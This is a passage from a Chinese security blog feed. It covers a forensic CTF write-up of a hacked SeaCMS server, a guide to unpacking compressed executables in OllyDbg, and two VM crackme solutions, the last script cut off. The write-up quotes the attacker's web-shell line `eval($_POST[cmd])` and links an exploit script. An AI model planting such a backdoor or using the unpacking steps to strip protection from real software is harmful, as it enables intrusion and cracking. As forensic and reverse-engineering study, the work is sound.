方式基本类似，但该方式通常会使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前 2 个）。若某函数有 4 个参数，则前 2 个参数分别使用 ECX、EDX 寄存器传递。</p><p>顾名思义，<code>fastcall</code> 方式的优势在于可以实现对函数的快速调用（从 CPU 的立场看，访问寄存器的速度要远比内存快得多）。单从函数调用本身来看，<code>fastcall</code> 方式非常快，但是有时需要额外的系统开销来管理 ECX、EDX 寄存器。倘若调用函数前 ECX 与 EDX 中存有重要数据，那么使用它们前必须先备份。此外，如果函数本身很复杂，需要 ECX、EDX 寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://reversecore.com/" target="_blank" rel="noopener">《逆向工程核心原理》</a><br><a href="https://www.jianshu.com/p/85a76f630c95" target="_blank" rel="noopener">https://www.jianshu.com/p/85a76f630c95</a><br><a href="https://bbs.pediy.com/thread-224583.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224583.htm</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018-信息安全铁人三项赛总决赛-数据赛</title>
    <link href="/2018/12/08/2018-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%95%B0%E6%8D%AE%E8%B5%9B/"/>
    <url>/2018/12/08/2018-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%95%B0%E6%8D%AE%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>第一次参加铁三，这次总决赛中的数据赛不再是之前的看数据包，而是直接给了一台 web 服务器溯源。</p><a id="more"></a><h1 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h1><p>第一次接触，全队也就自己一个人在做，挖了坑也填了坑，记录一下。</p><ol><li>服务器给的是命令行界面，不用想着变成图形界面来操作。因为我 <code>init 5</code> 变成图形界面后发现完全没法操作…后来为了变回去我误以为是 <code>init 0</code>，直接把服务器关了…后来只能让让主办方帮忙重启一下，差点被扣分…</li><li>刚开始的时候我主要目标是在每个用户的家目录以及 web 服务的根目录下查看是否有一些隐藏文件， 还是可以收集到一些重要信息的。</li><li>然后在数据库的目录下也可以发现一些信息。</li><li>之后慢慢发现最重要其实是 web 服务下的一些 log 文件，记录了黑客对服务器攻击的主要过程。</li><li>后来我还发现在每个用户家目录下的 <code>.bash_history</code> 也是很有用的，可以看到黑客提权后干的事情。</li><li>查看文件的话，建议用 <code>less -mN filename</code>，因为纯命令行的界面不能滚屏，用 <code>less</code> 就会方便很多。</li><li>刚登上服务器建议 <code>lastlog</code> 一下，看看除了 root 用户之外其他用户最后一次是什么时候登陆的。</li><li>其他命令的话，常用 <code>grep</code> 肯定是没错的…</li></ol><p>然后比赛的时候也找了两篇关于服务器溯源的文章，记录一下：</p><ul><li><a href="https://www.freebuf.com/articles/web/138867.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/138867.html</a></li><li><a href="https://www.freebuf.com/articles/rookie/179638.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/rookie/179638.html</a></li></ul><p>比赛的时候因为我们队排名在后来不是很靠前，然后我信息的收集也不是很到位，第一题怕做错会扣分，万一我们连三等奖都拿不到了，就没敢做。比赛结束后才知道每个队伍都会获奖…</p><h1 id="溯源过程记录"><a href="#溯源过程记录" class="headerlink" title=" 溯源过程记录"></a> 溯源过程记录</h1><p>题目差不多是这样：黑客在内网中拿到了两台肉鸡，然后通过这两台肉鸡对一台服务器进行了攻击，我们则需要对这台服务器溯源取证分析，并且找到黑客留下的后门。</p><p>刚拿到服务器，先在  在 root 的家目录下查看了一下隐藏文件，没想到一下子就有收获：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/1.png" srcset="/img/loading.gif" alt></p><p>在这里一下子就拿到了数据库的账号和密码。</p><p>然后尝试登陆一下数据库，发现有一个 <code>seacms</code> 的数据库，然后进去之后发现一些重要的信息：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/2.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/3.png" srcset="/img/loading.gif" alt></p><p>看完数据库，我就去查了一下关于海洋 cms 的洞：</p><ul><li><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/150042.html</a></li><li><a href="https://www.jianshu.com/p/ebf156afda49" target="_blank" rel="noopener">https://www.jianshu.com/p/ebf156afda49</a></li></ul><p>大概知道了是在 web 根目录下的 <code>search.php</code> 中存在漏洞，然后通过分析黑客可能用来攻击的<a href="https://github.com/SparkHex/seacms-getshell-poc" target="_blank" rel="noopener">脚本</a>，大概知道了攻击过程。</p><p>我这里还把 <code>search.php</code> 记录下来了：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/5.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/6.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/7.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/8.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/9.png" srcset="/img/loading.gif" alt></p><p>在 web 目录下还看到了一个 <code>360safe</code>，就截了张图：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/10.png" srcset="/img/loading.gif" alt></p><p>然后我看了一下每个用户家目录下的 <code>.bash_history</code>，正常的用户 <code>simple</code> 以及黑客创建的 <code>hacker</code> 都没啥，主要是 root 的 <code>.bash_history</code>：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/11.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/12.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/13.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/14.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/15.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/16.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/17.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/18.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/19.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/20.png" srcset="/img/loading.gif" alt></p><p>大概收集了这些，也能推断出黑客拿到权限后新建了一个叫 hacker 的用户，然后黑客的操作是从什么时候开始的也无法判断。再 <code>grep</code> 一下：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/21.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/22.png" srcset="/img/loading.gif" alt></p><p>下一步我就开始看日志，通过对 <code>.bash_history</code> 的阅读，判断主要是在 <code>/var/log/httpd</code> 下和 <code>/var/www/html/logs</code> 下的 log 文件：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/23.png" srcset="/img/loading.gif" alt></p><p>然后就开始对 log 文件一行一行看下来：</p><p>基本看到几个 ip：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/24.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/25.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/26.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/27.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/28.png" srcset="/img/loading.gif" alt></p><p>在后面一点的时候会看到 <code>192.168.12.173</code>，通过 GET 的 url 很容易判断出在用脚本打网站：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/29.png" srcset="/img/loading.gif" alt></p><p>最后看到可以黑客在放后门 <code>eval($_POST[cmd])</code>：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/30.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛/31.png" srcset="/img/loading.gif" alt></p><p>大概的分析就是这样，中间也踩了很多坑。我最后的判断是：</p><table><thead><tr><th style="text-align:center">IP</th><th style="text-align:center">IDENTITY</th><th style="text-align:center">OPERATING SYSTEM</th></tr></thead><tbody><tr><td style="text-align:center">192.168.31.119</td><td style="text-align:center">admin</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.129</td><td style="text-align:center">victim</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.173</td><td style="text-align:center">bot</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.156</td><td style="text-align:center">bot</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.125</td><td style="text-align:center">bot</td><td style="text-align:center">android</td></tr><tr><td style="text-align:center">192.168.31.73</td><td style="text-align:center">bot</td><td style="text-align:center">android</td></tr></tbody></table><p>感觉自己整体分析下来应该方向是没错的，可能因为自己没学过计网，对一些网络的协议和请求方式没有了解很透彻，导致比赛的时候第一题问两台肉鸡的 ip 就判断错了，然后就没敢做下去…</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单压缩壳脱壳指南</title>
    <link href="/2018/11/29/%E7%AE%80%E5%8D%95%E5%8E%8B%E7%BC%A9%E5%A3%B3%E8%84%B1%E5%A3%B3%E6%8C%87%E5%8D%97/"/>
    <url>/2018/11/29/%E7%AE%80%E5%8D%95%E5%8E%8B%E7%BC%A9%E5%A3%B3%E8%84%B1%E5%A3%B3%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<p>记录一下脱一些简单压缩壳的过程（主要是找 OEP）。</p><a id="more"></a><h1 id="压缩壳和加密壳"><a href="#压缩壳和加密壳" class="headerlink" title="压缩壳和加密壳"></a>压缩壳和加密壳</h1><ul><li>在理解什么是压缩壳的时候，先了解什么是壳。壳可以简单理解为就是在 PE 文件中包含了代码，而又不影响 PE 文件的执行。其中压缩壳是让 PE 文件变小的壳。在运行加了压缩壳的程序时，壳先对程序进行解压缩，然后再运行源程序。</li><li>加密壳主要就是针对软件的加密保护，也有一些人用加密壳来做一些木马的免杀，导致一些杀软件查到该壳就误报病毒。加密壳的种类有很多，如果手工脱和修复，即使对高手来脱，也需要费很大力气。</li></ul><h2 id="压缩壳的原理（以-UPX-为例）"><a href="#压缩壳的原理（以-UPX-为例）" class="headerlink" title="压缩壳的原理（以 UPX 为例）"></a>压缩壳的原理（以 UPX 为例）</h2><p>压缩壳将程序的 <code>.text</code> 段和 <code>.data</code> 段进行压缩，不改变 <code>.rsrc</code> 段，并在运行时将对应的 <code>.text</code> 段和 <code>.data</code> 段解压缩来还原程序。</p><h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><ul><li>调试工具：<code>Ollydbg</code></li><li>查壳工具：<code>ExeInfo</code> / <code>PEID</code></li><li>脱壳工具：<code>LordPE</code>、<code>ImportRE</code></li></ul><p>OD 快捷键：</p><table><thead><tr><th style="text-align:center">快捷键</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>F7</code></td><td style="text-align:center">单步步入</td></tr><tr><td style="text-align:center"><code>F8</code></td><td style="text-align:center">单步步过</td></tr><tr><td style="text-align:center"><code>F4</code></td><td style="text-align:center">运行到选定位置</td></tr><tr><td style="text-align:center"><code>F2</code></td><td style="text-align:center">设置断点</td></tr><tr><td style="text-align:center"><code>Ctrl+F2</code></td><td style="text-align:center">重新开始</td></tr><tr><td style="text-align:center"><code>F9</code></td><td style="text-align:center">运行</td></tr><tr><td style="text-align:center"><code>Shift+F9</code></td><td style="text-align:center">忽略异常运行</td></tr><tr><td style="text-align:center"><code>Alt+F9</code></td><td style="text-align:center">执行到用户代码</td></tr></tbody></table><h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><h2 id="LordPE"><a href="#LordPE" class="headerlink" title="LordPE"></a>LordPE</h2><p>LordPE 用来将运行时的程序 dump 出来：</p><ol><li>找到程序右键，<code>修正镜像大小</code>；</li><li><code>完整转存</code>。</li></ol><p><img src="/pics/脱壳指南/1.png" srcset="/img/loading.gif" alt></p><h2 id="ImportREC"><a href="#ImportREC" class="headerlink" title="ImportREC"></a>ImportREC</h2><p>ImportREC 用来修复原始程序的 IAT：</p><ol><li>找到程序，输入找到的 <code>OEP</code> 的值；</li><li>点击 <code>IAT自动搜索</code>；</li><li><code>获取导入表</code>；</li><li><code>显示无效的</code>，如果有无效的表清除即可；</li><li><code>修正转储</code>。</li></ol><p><img src="/pics/脱壳指南/2.png" srcset="/img/loading.gif" alt></p><h1 id="查找-OEP"><a href="#查找-OEP" class="headerlink" title="查找 OEP"></a>查找 OEP</h1><p>压缩壳的流程清楚了，修复 IAT 的过程也有了，我们只需要找到 OEP，就能完整地脱去一个压缩壳。</p><h2 id="单步执行法"><a href="#单步执行法" class="headerlink" title="单步执行法"></a>单步执行法</h2><p>单步执行法，通过单步执行一步一步，找到 OEP（程序入口点）。如果遇到向下的跳转则默认跳转：</p><p><img src="/pics/脱壳指南/3.png" srcset="/img/loading.gif" alt></p><p>遇到向上的跳转则直接执行到下一条语句，避免陷入循环，即 F4：</p><p><img src="/pics/脱壳指南/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/脱壳指南/5.png" srcset="/img/loading.gif" alt></p><p>最后执行到 POPAD 处会有一个大范围的 JMP，即转到 OEP。</p><h2 id="ESP-定律法（堆栈平衡法）"><a href="#ESP-定律法（堆栈平衡法）" class="headerlink" title="ESP 定律法（堆栈平衡法）"></a>ESP 定律法（堆栈平衡法）</h2><p>利用压缩前后 ESP 不变的定律。在指令 PUSHAD 时单步一下，会发现寄存器中只有 ESP 发生变化：</p><p><img src="/pics/脱壳指南/6.png" srcset="/img/loading.gif" alt></p><p>然后右键 ESP 的值，跟随数据窗口：</p><p><img src="/pics/脱壳指南/7.png" srcset="/img/loading.gif" alt></p><p> 接下来在数据窗口中选择 ESP 的值，并设置硬件访问断点，即在下次对 ESP 寄存器有读操作时被断下：</p><p><img src="/pics/脱壳指南/8.png" srcset="/img/loading.gif" alt></p><p>同样也可以通过 <code>dd xxxxxxxx</code> 或者 <code>hr xxxxxxxx</code> 设下硬件断点，在下方 command 处输入：</p><p><img src="/pics/脱壳指南/9.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/脱壳指南/10.png" srcset="/img/loading.gif" alt></p><p>然后 F9 继续执行到 POPAD 后，删去硬件断点：</p><p><img src="/pics/脱壳指南/11.png" srcset="/img/loading.gif" alt></p><p>单步到 OEP。</p><h2 id="特殊的-ESP-定律法"><a href="#特殊的-ESP-定律法" class="headerlink" title="特殊的 ESP 定律法"></a>特殊的 ESP 定律法</h2><p>不遵循 ESP 不变的定律，FSG2.0 专用的方法。单步走到 POPAD 的下一条指令，观察堆栈窗口从上往下数第四个地址的值即为 OEP 的地址。右键在反汇编窗口跟随：</p><p><img src="/pics/脱壳指南/26.png" srcset="/img/loading.gif" alt></p><p>下硬件断点后 f9 运行，到达 OEP。</p><h2 id="二次内存镜像法"><a href="#二次内存镜像法" class="headerlink" title="二次内存镜像法"></a>二次内存镜像法</h2><p>以 UPX 为例。进入内存段中，先找到程序段的第一个 <code>.rsrc</code>，并设下断点后 Shift+F9 忽略异常执行，此处断下来后，压缩壳已经把所有的数据都解压缩了：</p><p><img src="/pics/脱壳指南/12.png" srcset="/img/loading.gif" alt></p><p>再在 UPX0 段下断，即恢复后的代码段，再重复上面的操作：</p><p><img src="/pics/脱壳指南/13.png" srcset="/img/loading.gif" alt></p><p>然后按照单步执行法往下走就能看到 POPAD 还有 JMP：</p><p><img src="/pics/脱壳指南/14.png" srcset="/img/loading.gif" alt></p><h2 id="一步直达法"><a href="#一步直达法" class="headerlink" title="一步直达法"></a>一步直达法</h2><p>以 UPX 为例。在遇到指令 PUSHAD 后，通过经验可以判断必存在 POPAD 来恢复通用寄存器，直接 Ctrl+F 搜索指令找到 OEP：</p><p><img src="/pics/脱壳指南/15.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/脱壳指南/16.png" srcset="/img/loading.gif" alt></p><h2 id="模拟跟踪法"><a href="#模拟跟踪法" class="headerlink" title="模拟跟踪法"></a>模拟跟踪法</h2><p>以 ASPack 为例。先进入内存中，找到 SFX：</p><p><img src="/pics/脱壳指南/17.png" srcset="/img/loading.gif" alt></p><p>在命令框输入 <code>tc eip&lt;xxxxxxxx</code>（即追踪 EIP 小于指定地址时的代码，也就是程序的代码段）：</p><p><img src="/pics/脱壳指南/18.png" srcset="/img/loading.gif" alt></p><p>会看到 OD 左上角变成了跟踪：</p><p><img src="/pics/脱壳指南/19.png" srcset="/img/loading.gif" alt></p><p>等待一段时间就会跳转到 OEP。</p><h2 id="SFX-模拟跟踪法"><a href="#SFX-模拟跟踪法" class="headerlink" title="SFX 模拟跟踪法"></a>SFX 模拟跟踪法</h2><p>以 ASPack 为例。进入<code>选项-&gt;调试设置</code>（<code>Alt+O</code>）：</p><p><img src="/pics/脱壳指南/20.png" srcset="/img/loading.gif" alt></p><p>一般情况选择块方式跟踪或者字节方式，这里选择前者：</p><p><img src="/pics/脱壳指南/21.png" srcset="/img/loading.gif" alt></p><p>确定后，重新载入（<code>Ctrl+F2</code>），OD 会自动地去查找到 OEP。</p><h2 id="最后一次异常法"><a href="#最后一次异常法" class="headerlink" title="最后一次异常法"></a>最后一次异常法</h2><p>以 PECompact 为例。先在调试选项中忽略所有异常。重新载入后，执行 m 次 shift+f9，直到程序跑飞。然后重新载入程序，执行 m-1 次 shift+f9。在堆栈窗口中找到 SE 句柄，然后 Ctrl+G 转到 SE 句柄：</p><pre><code>0045DE74    B8 F9CB45F0     mov eax,0xF045CBF90045DE79    8D88 9E120010   lea ecx,dword ptr ds:[eax+0x1000129E]0045DE7F    8941 01         mov dword ptr ds:[ecx+0x1],eax0045DE82    8B5424 04       mov edx,dword ptr ss:[esp+0x4]0045DE86    8B52 0C         mov edx,dword ptr ds:[edx+0xC]0045DE89    C602 E9         mov byte ptr ds:[edx],0xE90045DE8C    83C2 05         add edx,0x50045DE8F    2BCA            sub ecx,edx                              ; ntdll_1.7720353D0045DE91    894A FC         mov dword ptr ds:[edx-0x4],ecx           ; qqspirit.0045DE740045DE94    33C0            xor eax,eax0045DE96    C3              retn0045DE97    B8 78563412     mov eax,0x12345678                       ; 下断点</code></pre><p>随后执行到断点处，单步跟到 OEP。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>有时候脱完壳却不能运行程序，需要修复 IAT。首先载入 OD，在 OEP 往下找 Call：</p><p><img src="/pics/脱壳指南/22.png" srcset="/img/loading.gif" alt></p><p>找到后在命令框处输入 <code>d xxxxxx</code>：</p><p><img src="/pics/脱壳指南/23.png" srcset="/img/loading.gif" alt></p><p>在数据窗口中，往上查找，直到数据为 0，记录下 IAT 地址；往下也同样：</p><p><img src="/pics/脱壳指南/24.png" srcset="/img/loading.gif" alt></p><p>在 ImportREC 中修改 OEP 后，不采取自动获取的方式，手动输入 IAT 起始地址和大小，偷懒的办法是大小直接输 1000：</p><p><img src="/pics/脱壳指南/25.png" srcset="/img/loading.gif" alt></p><p>然后清除掉无效的，转储一下得到完整程序。</p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.cnblogs.com/hongyuyingxiao/p/9630173.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongyuyingxiao/p/9630173.html</a><br><a href="https://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/" target="_blank" rel="noopener">https://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/</a><br><a href="https://www.cnblogs.com/iBinary/p/7764483.html" target="_blank" rel="noopener">https://www.cnblogs.com/iBinary/p/7764483.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单虚拟机指令类题目分析</title>
    <link href="/2018/11/22/%E7%AE%80%E5%8D%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8C%87%E4%BB%A4%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/"/>
    <url>/2018/11/22/%E7%AE%80%E5%8D%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8C%87%E4%BB%A4%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>刚接触逆向的时候做过一两道虚拟机指令的题，记得有一道是 RCTF 的 magic，当时还跟着无名大佬的 wp 做了很久。但是那个时候对 VM 的理解不是很深，然后这两天看到南邮的两道题，仔细做了一下，发现很适合入门 VM 这类型的题目，所以记录一下。</p><a id="more"></a><h1 id="WxyVM1"><a href="#WxyVM1" class="headerlink" title="WxyVM1"></a>WxyVM1</h1><p>拿到文件先 file 一下：</p><pre><code>AssassinQ@MacBook-Air  ~/Downloads  file WxyVM1WxyVM1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0391bf87f6f7a11b4d23e29eb39330a762aff5b4, stripped</code></pre><p>然后拿到虚拟机下运行一下看看什么样：</p><pre><code>[Desktop] ./WxyVM1                                                     3:25:21[WxyVM 0.0.1]input your flag:nctf{123456}wrong</code></pre><p>没看出啥东西，基本判断就是程序应该是一个对 flag 的加密。然后拖进 ida 里分析：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v4; // [rsp+Bh] [rbp-5h]  signed int i; // [rsp+Ch] [rbp-4h]  puts(&quot;[WxyVM 0.0.1]&quot;);  puts(&quot;input your flag:&quot;);  scanf(&quot;%s&quot;, &amp;input);  v4 = 1;  vm_start();  if ( strlen(&amp;input) != 24 )    v4 = 0;  for ( i = 0; i &lt;= 23; ++i )  {    if ( *(&amp;input + i) != enc[i] )      v4 = 0;  }  if ( v4 )    puts(&quot;correct&quot;);  else    puts(&quot;wrong&quot;);  return 0LL;}</code></pre><p>main 函数中输入一个 flag，然后一个 vm 加密函数，再将加密过后的 flag 与存放在 data 段中的 enc 比较，如果相等那么输出 <code>correct</code>。所以基本思路应该是通过 enc 逆出 flag。然后进到 <code>vm_start</code> 函数中看看：</p><pre><code class="cpp">__int64 vm_start(){  unsigned int v0; // ST04_4  __int64 result; // rax  signed int i; // [rsp+0h] [rbp-10h]  char v3; // [rsp+8h] [rbp-8h]  for ( i = 0; i &lt;= 14999; i += 3 )  {    v0 = byte_6010C0[i];    v3 = byte_6010C0[i + 2];    result = v0;    switch ( v0 )    {      case 1u:        result = byte_6010C0[i + 1];        *(&amp;input + result) += v3;        break;      case 2u:        result = byte_6010C0[i + 1];        *(&amp;input + result) -= v3;        break;      case 3u:        result = byte_6010C0[i + 1];        *(&amp;input + result) ^= v3;        break;      case 4u:        result = byte_6010C0[i + 1];        *(&amp;input + result) *= v3;        break;      case 5u:        result = byte_6010C0[i + 1];        *(&amp;input + result) ^= *(&amp;input + byte_6010C0[i + 2]);        break;      default:        continue;    }  }  return result;}</code></pre><p>这里发现在 data 段中还有一个 byte 数组。总共有 15000 个数，每三个数一组。第一个数作为需要执行的指令，第二个数为输入 flag 的下标，第三个数为与其进行操作的数据。到这里基本已经清楚了，把数据都 dump 下来，写个脚本逆一下就 ok 了。然后还需要注意的是，这里的运算是以 byte 为单位，可能会产生溢出，所以应该每次操作之后模一下 256。</p><p>看到网上大多数 wp 都是用 idc 脚本 patch，因为数据确实太多了，连 lazyida 都 dump 不出来。我是选择手动复制出来所有的数据，然后再用 python 正则匹配一下，提取出来。</p><p><img src="/pics/简单虚拟机指令类题目分析/1.png" srcset="/img/loading.gif" alt></p><p>最后的脚本：</p><pre><code class="python">import ref = open(&#39;WxyVM1.txt&#39;, &#39;r&#39;)enc = [0xFFFFFFC4, 0x00000034, 0x00000022, 0xFFFFFFB1, 0xFFFFFFD3, 0x00000011, 0xFFFFFF97, 0x00000007, 0xFFFFFFDB, 0x00000037, 0xFFFFFFC4, 0x00000006, 0x0000001D, 0xFFFFFFFC, 0x0000005B, 0xFFFFFFED, 0xFFFFFF98, 0xFFFFFFDF, 0xFFFFFF94, 0xFFFFFFD8, 0xFFFFFFB3, 0xFFFFFF84, 0xFFFFFFCC, 0x00000008]text = f.read()f.close()pat = re.compile(r&#39;db.{5}&#39;)find_pat = pat.findall(text)nums = []for n in find_pat:    n = n[2:].strip()    if n.endswith(&#39;h&#39;):        n = int(n[:-1], 16)    else:        n = int(n)    nums.append(n)def cal(v0, v3, index):    if v0 == 1:        enc[index] = (enc[index] - v3) % 256    elif v0 == 2:        enc[index] = (enc[index] + v3) % 256    elif v0 == 3:        enc[index] = (enc[index] ^ v3) % 256    elif v0 == 4:        enc[index] = (enc[index] / v3) % 256    elif v0 == 5:        enc[index] = (enc[index] ^ enc[v3]) % 256for i in range(5000):    t = 5000 - i    v0 = nums[3 * t - 3]    v3 = nums[3 * t - 1]    res = nums[3 * t - 2]    cal(v0, v3, res)flag = &#39;&#39;for i in range(len(enc)):    flag += chr(enc[i])print flag</code></pre><h1 id="WxyVM2"><a href="#WxyVM2" class="headerlink" title="WxyVM2"></a>WxyVM2</h1><p>file 一下：</p><pre><code>AssassinQ@MacBook-Air  ~/Downloads  file WxyVM2WxyVM2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e57d1a1b70ac3d843afa30523dbbbc53c4ff341f, stripped</code></pre><p>运行一下，发现和上一题 VM 应该基本是同一个类型：</p><pre><code>[Desktop] ./WxyVM2                                                     3:25:36[WxyVM 0.0.2]input your flag:nctf{123456}wrong</code></pre><p>然后拖进 ida 里，只有一个 main 函数。f5 反编译发现提示说函数太大，无法反编译。这个时候需要先修改一下 ida 的配置文件 <code>hexrays.cfg</code>，<a href="https://www.dllhook.com/post/217.html" target="_blank" rel="noopener">具体操作</a>。修改完后看一下 main 函数的情况：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v4; // [rsp+Bh] [rbp-5h]  signed int i; // [rsp+Ch] [rbp-4h]  puts(&quot;[WxyVM 0.0.2]&quot;);  puts(&quot;input your flag:&quot;);  scanf(&quot;%s&quot;, &amp;input);  v4 = 1;  if ( strlen(&amp;input) != 25 )    v4 = 0;  [......]  for ( i = 0; i &lt;= 24; ++i )  {    if ( *(&amp;input + i) != enc[i] )      v4 = 0;  }  if ( v4 )    puts(&quot;correct&quot;);  else    puts(&quot;wrong&quot;);  return 0LL;}</code></pre><p>头和尾是基本一样的，主要是中间的部分，是一段又臭又长的对数据的加密：</p><p><img src="/pics/简单虚拟机指令类题目分析/2.png" srcset="/img/loading.gif" alt></p><p>我们输入的 input 应该都是 byte，而这么多 dword 的操作其实都是对加密部分的混淆。然后这里的话我是把 main 函数提出来，然后筛选出 byte 开头的语句，并且通过一系列切片简化语句。然后把数据段里被加密的 flag 即 enc 数组 dump 出来，将提取出来的语句进行逆向的实现，就能输出 flag。</p><p>其他的一些注意实现和前一题一样。最后的实现脚本：</p><pre><code class="python">f = open(&#39;WxyVM2.txt&#39;, &#39;r&#39;)text = f.read()f.close()enc = [0xFFFFFFC0, 0xFFFFFF85, 0xFFFFFFF9, 0x0000006C, 0xFFFFFFE2, 0x00000014, 0xFFFFFFBB, 0xFFFFFFE4, 0x0000000D, 0x00000059, 0x0000001C, 0x00000023, 0xFFFFFF88, 0x0000006E, 0xFFFFFF9B, 0xFFFFFFCA, 0xFFFFFFBA, 0x0000005C, 0x00000037, 0xFFFFFFFF, 0x00000048, 0xFFFFFFD8, 0x0000001F, 0xFFFFFFAB, 0xFFFFFFA5]ori = text.split(&#39;;\n&#39;)ops = []for s in ori:    if s.startswith(&#39;d&#39;):        continue    elif s.startswith(&#39;b&#39;):        t = s[:1] + s[9:11] + s[12:14] + s[15:]        ops.append(t)    elif s.startswith(&#39;--&#39;):        t = s[2:3] + s[-2:] + &#39;-=1&#39;        ops.append(t)    elif s.startswith(&#39;++&#39;):        t = s[2:3] + s[-2:] + &#39;+=1&#39;        ops.append(t)    else:        continueops = ops[::-1]def getPart(op):    index = int(op[1:3], 16)    symbol = op[3:4]    num = op[5:]    if num.endswith(&#39;u&#39;):        num = num[:-1]    if num.startswith(&#39;0x&#39;):        num = int(num, 16)    else:        num = 